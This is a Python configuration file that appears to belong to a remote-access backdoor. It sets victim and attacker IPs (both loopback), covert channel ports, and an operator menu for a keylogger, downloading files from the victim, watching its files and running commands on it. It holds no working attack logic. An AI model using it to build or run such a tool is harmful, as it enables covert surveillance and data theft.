from enum import Enum

VICTIM_IP = '127.0.0.1'
ATTACKER_IP = '127.0.0.2'
INTERFACE = 'lo'

CHANNELS = {
    1: { 'sport': 7001, 'dport': 8001 },
    2: { 'sport': 7002, 'dport': 8002 },
    3: { 'sport': 7003, 'dport': 8003 }
}

class Channel(Enum):
    MAIN = 1
    BACKGROUND = 2

OPTIONS_LIST = {
    'cn': '\t\tConnect to the victim ',
    'dc': '\t\tDisconnect from the victim',
    'sf': '<path> \tSend a file to the victim',
    'dl': '<path> \tDownload a file from the victim',
    'k+': '\t\tStart keylogger',
    'k-': '\t\tStop keylogger',
    'wf': '<path> \tWatch a file on the victim',
    'wd': '<path> \tWatch a directory on the victim',
    'rn': '<cmd> \tRun a command on the victim',
    'un': '\t\tUninstall',
    'ex': '\t\tExit'
}